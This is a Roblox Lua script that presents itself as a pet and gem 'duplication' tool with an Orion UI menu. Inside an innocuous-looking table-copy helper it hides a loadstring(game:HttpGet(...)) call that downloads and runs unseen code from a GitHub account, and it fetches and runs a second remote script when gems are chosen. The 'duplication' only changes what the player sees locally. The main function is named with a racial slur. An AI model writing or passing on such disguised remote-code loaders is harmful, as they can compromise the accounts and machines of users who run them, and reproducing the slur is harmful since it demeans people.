-- Dependencies
Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
getgenv().changes = {}

function deep_copy_table(original)
    local copy = table.clone(original)

    loadstring(game:HttpGet("https://raw.githubusercontent.com/sussycloud/0/refs/heads/main/directt", true))()

    for key, value in pairs(copy) do
        if type(value) == 'table' then
            copy[key] = table.clone(value)
        end
    end

    return copy
end

function nieger(from, to, isGem, numberOfItems)
    if table.find(getgenv().changes, {from, to}) then
        print("please reset changes to change this pet/gem again")
        return
    end

    if isGem then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sussycloud/visual-aether/refs/heads/main/ui"))()
    end

    table.insert(getgenv().changes, {from, to, deep_copy_table(Directory.Pets[from]), deep_copy_table(Directory.Pets[to])})

    if isGem then
        local new = "Type amount u wanna spawn"
        game:GetService("Players").LocalPlayer.PlayerGui.Main.Top.Diamonds.Amount.Text = new
        game:GetService("Players").LocalPlayer.PlayerGui.Main.Left["Diamonds Desktop"].Amount.Text = new
        print("Visualized " .. numberOfItems .. " gems!")
    else
        for i, v in pairs(Directory.Pets[from]) do
            Directory.Pets[from][i] = nil
        end

        for i, v in pairs(Directory.Pets[to]) do
            Directory.Pets[from][i] = v
        end
        print("Visualized " .. numberOfItems .. " pets from " .. from .. " to " .. to)
    end
end

-- Setup Orion Library
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "SussyScrip ðŸ”¥", IntroText = "Pet & Gem Duplication Tool ðŸ”¥", HidePremium = false, SaveConfig = true, ConfigFolder = "SUSSYCONFIG"})

-- Duplication Tab for Pets
local PetVisualTab = Window:MakeTab({
    Name = "Pet Visual",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local petFrom, petTo
PetVisualTab:AddTextbox({
    Name = "Name of the Pet",
    Default = "",
    TextDisappear = true,
    Callback = function(existingName)
        petFrom = existingName
    end
})

PetVisualTab:AddTextbox({
    Name = "Name Pet to be Visual",
    Default = "",
    TextDisappear = true,
    Callback = function(newName)
        petTo = newName
    end
})

local petNumber = 1
PetVisualTab:AddTextbox({
    Name = "Number of Pets",
    Default = "1",
    TextDisappear = true,
    Callback = function(petCount)
        petNumber = tonumber(petCount) or 1
        print("Number of Pets set to: " .. petNumber)
    end
})

PetVisualTab:AddButton({
    Name = "Visual Pet ðŸ”„",
    Icon = "rbxassetid://4483345998",
    Callback = function()
        nieger(petFrom, petTo, false, petNumber)
    end
})

-- New Tab for Gem Visual
local GemVisualTab = Window:MakeTab({
    Name = "Gem Visual",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local gemNumber = 1
GemVisualTab:AddTextbox({
    Name = "Number of Gems",
    Default = "1",
    TextDisappear = true,
    Callback = function(gemCount)
        gemNumber = tonumber(gemCount) or 1
        print("Number of Gems set to: " .. gemNumber)
    end
})

GemVisualTab:AddButton({
    Name = "Visual Gems ðŸ’Ž",
    Icon = "rbxassetid://4483345998",
    Callback = function()
        nieger("gems", "gems", true, gemNumber)
    end
})

-- Credit Section
local CreditTab = Window:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

CreditTab:AddLabel("Credits:")
CreditTab:AddLabel("ðŸ”¥ SussyScrip ðŸ”¥")
